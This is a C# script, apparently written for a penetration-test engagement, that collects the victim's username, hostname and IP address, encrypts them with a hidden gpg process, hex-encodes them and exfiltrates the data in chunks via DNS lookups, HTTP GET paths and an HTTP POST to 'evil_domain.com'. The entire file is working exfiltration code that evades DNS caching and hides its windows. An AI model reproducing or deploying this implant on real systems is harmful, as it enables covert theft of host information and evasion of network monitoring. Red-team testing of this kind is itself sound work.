using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Net.NetworkInformation;


/// <summary>
/// Store username and hostname. THIS WORKS. just need to change paths
/// </summary>
string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
string hostname = Dns.GetHostName();
// Commence the bullshit of getting the right IPv4 address
string hostIP = ""; // If you don't initialize it, you can't pull from the nest of bullshit.
foreach (NetworkInterface netInterface in NetworkInterface.GetAllNetworkInterfaces())
{
    IPInterfaceProperties ipProps = netInterface.GetIPProperties();
    foreach (UnicastIPAddressInformation addr in ipProps.UnicastAddresses.Where(x => ipProps.GatewayAddresses.Count > 0))
    {
        if (addr.Address.AddressFamily == AddressFamily.InterNetwork)
        {
            hostIP = addr.Address.ToString(); // Nest of bullshit.
            //Console.WriteLine(addr.Address.ToString());
        }
    }
}
//Console.WriteLine(hostIP);

string[] exfildata =
{
    username, hostname, hostIP
};
await File.WriteAllLinesAsync("C:\\Users\\test\\Desktop\\input\\exfil.txt", exfildata);
///
///
///



/// </summary>
/// Encrypt with pub, wait, encode with hex
/// </summary>
// Encrypt with pub. THIS WORKS. just need to change paths.
System.Diagnostics.Process process = new System.Diagnostics.Process();
System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
//remove below comment after confirming it works
startInfo.CreateNoWindow = true;
startInfo.FileName = "C:\\temp\\gpg.exe";
startInfo.Arguments = "-e -o C:\\Users\\test\\Desktop\\output\\testencrypt.txt -r test  c:\\users\\test\\desktop\\input\\exfil.txt";
process.StartInfo = startInfo;
process.Start();

// need this otherwise program gets ahead of itself. could implement loop and watcher
System.Threading.Thread.Sleep(1000);

/// <summary>
/// Hex encoder
/// </summary>
// Read file encrypt and encode with hex. THIS WORKS. just need to change paths.
string HexMeBaby = File.ReadAllText(@"C:\\Users\\test\\Desktop\\output\\testencrypt.txt");
byte[] bytes = Encoding.Default.GetBytes(HexMeBaby);
string hexed = BitConverter.ToString(bytes);
hexed = hexed.Replace("-", "");

File.WriteAllText("C:\\Users\\test\\Desktop\\output\\hexed.txt", hexed);
///
///
///


/// <summary>
// Break hexed down into chunks suitable for DNS
/// </summary>
// Temp. Read file into string
hexed = File.ReadAllText(@"C:\\Users\\test\\Desktop\\output\\hexed.txt");
// Probably end up combining a few things into this

// Count length and print
int hexedCount = hexed.Length;
//Console.WriteLine($"{hexedCount}");

// find out how many chunks i need
int chunks = (hexedCount / 63) + 1;
//Console.WriteLine($"{chunks}");
///
///
///


/// <summary>
// list out chunks. POC code. probably not necessary anymore
/// </summary>
int begin = hexed.IndexOf(hexed[0]);
for (int counter = 0; counter < chunks; counter++)
{
    //Console.WriteLine("Block: {0}", counter + 1);
    //Console.WriteLine("{0}", hexed.Substring(begin, 63));
    begin = begin + 63;
    // has to do this otherwise it gets pissed that it can't find 63 chars in the last block
    if (counter == chunks - 2)
    {
        //Console.WriteLine("Block: {0}", counter + 2);
        //Console.WriteLine("{0}", hexed.Substring(begin));
        counter++;
    }
}
///
///
///



/// <summary>
/// This area handles DNS lookups
/// </summary>
Random rnd = new Random();
int defeatDNScache = rnd.Next(100, 99999);
//Console.WriteLine($"{defeatDNScache}");

// Set index
begin = hexed.IndexOf(hexed[0]);
// start the loop to cycle through the chunks
for (int counter = 0; counter < chunks; counter++)
{
    string tempdns = hexed.Substring(begin, 63);
    string DNSlookup = $"{tempdns}.{defeatDNScache}.{(counter + 1)}.{chunks}.1.evil_domain.com"; // Use subdomain before domain for USB identification
    //Console.WriteLine("{0}", hexed.Substring(begin, 63));
    //Console.WriteLine("{0}", DNSlookup);
    try
    {
        Dns.GetHostEntry(DNSlookup);
    }
    // Need this to ignore the 404 otherwise exception halts program
    catch
    {

    }
    begin = begin + 63;
    // has to do this otherwise it gets pissed that it can't find 63 chars in the last block
    if (counter == chunks - 2)
    {
        tempdns = hexed.Substring(begin);
        DNSlookup = $"{tempdns}.{defeatDNScache}.{(counter + 2)}.{chunks}.1.evil_domain.com"; // Use subdomain before domain for USB identification
        // Console.WriteLine("Block: {0}", counter + 2);
        //Console.WriteLine("{0}", hexed.Substring(begin));
        //Console.WriteLine("{0}", DNSlookup);
        try
        {
            Dns.GetHostEntry(DNSlookup);
        }
        // Need this to ignore the 404 otherwise exception halts program
        catch
        {

        }
        counter++;
    }

}
///
///
///


/// <summary>
/// This area handles HTTP GET requests
/// </summary>
begin = hexed.IndexOf(hexed[0]);
for (int counter = 0; counter < chunks; counter++)
{
    string tempget = hexed.Substring(begin, 63);
    var getclient = new WebClient();
    try
    {
        var text = getclient.DownloadString($"http://evil_domain.com/20220410engagement/get/{tempget}/{(counter + 1)}/{chunks}/1/testquery.js"); // Use number before file to identify USB
    }
    // Need this to ignore the 404 otherwise exception halts program
    catch
    {

    }
    begin = begin + 63;
    // has to do this otherwise it gets pissed that it can't find 63 chars in the last block
    if (counter == chunks - 2)
    {
        tempget = hexed.Substring(begin);
        getclient = new WebClient();
        try
        {
            var text = getclient.DownloadString($"http://evil_domain.com/20220410engagement/get/{tempget}/{(counter + 2)}/{chunks}/1/testquery.js"); // Use number before file to identify USB
        }
        // Need this to ignore the 404 otherwise exception halts program
        catch
        {

        }
        counter++;
    }
}
///
///
///


/// <summary>
/// This area handles HTTP POST request
/// </summary>
begin = hexed.IndexOf(hexed[0]);
string tempstring = hexed.Substring(begin, 63);
var client = new WebClient();
client.QueryString.Add("parameter1", hexed);
try
{
    var data = client.UploadValues($"http://evil_domain.com/20220410engagement/post/{tempstring}/1/testquery.js", "POST", client.QueryString); // Use number before file to identify USB
}
// Need this to ignore the 404 otherwise exception halts program
catch
{

}
///
///
///
